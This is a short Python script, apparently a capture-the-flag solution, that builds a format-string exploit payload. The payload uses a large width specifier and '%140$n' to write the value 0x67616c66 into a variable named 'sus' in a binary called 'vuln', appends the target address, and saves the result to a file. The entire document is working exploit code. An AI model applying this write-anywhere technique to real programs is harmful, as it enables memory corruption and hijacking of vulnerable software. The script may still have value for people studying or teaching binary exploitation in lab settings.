TARGET_ADDRESS = 0x404060 # Found with objdump -t vuln (address of the "sus" variable).

def pad_payload(payload):
    padding_length = 1024 - len(payload) - 16  # Reserve space for address
    return payload + b"X" * padding_length

# Function to manually convert a 64-bit address to a byte string (little-endian)
def address_to_bytes(address):
    """
    Converts a 64-bit integer address to a little-endian byte string.
    """
    bytes_list = []
    for _ in range(8):  # 64 bits / 8 bits per byte
        bytes_list.append(address & 0xff)
        address >>= 8
    return bytes(bytes_list)

exploit_payload = b"AAAAAAAA"
# Calculate the number of bytes needed to output before writing the value
exploit_payload += b"%" + str(0x67616c66 - len(exploit_payload)).encode() + b"x"
# Format specifier to write a value into memory at a specific location
exploit_payload += b"%140$n"
# Pad the exploit payload to the required length
exploit_payload = pad_payload(exploit_payload)
# Append the target address at the end of the payload, manually converting the address to bytes
exploit_payload += address_to_bytes(TARGET_ADDRESS)

with open("payload", "w") as payload:
    payload.write(exploit_payload.decode('utf-8'))
